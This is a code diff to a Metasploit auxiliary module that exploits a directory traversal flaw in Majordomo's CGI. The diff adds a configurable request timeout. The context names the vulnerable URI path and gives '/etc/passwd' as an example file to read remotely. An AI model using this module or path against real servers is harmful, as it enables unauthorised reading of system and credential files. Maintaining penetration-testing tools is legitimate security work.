@@ -35,10 +35,15 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
-        OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
-        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),
+        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl' ]),
+        OptString.new('URI', [ true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=' ]),
+        OptInt.new('DEPTH', [ true, 'Define the max traversal depth', 8 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -62,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
           {
             'method'  => 'GET',
             'uri'     => uri + payload,
-          }, 25)
+          }, timeout)
 
         if res.nil?
           print_error("#{rhost}:#{rport} Connection timed out")
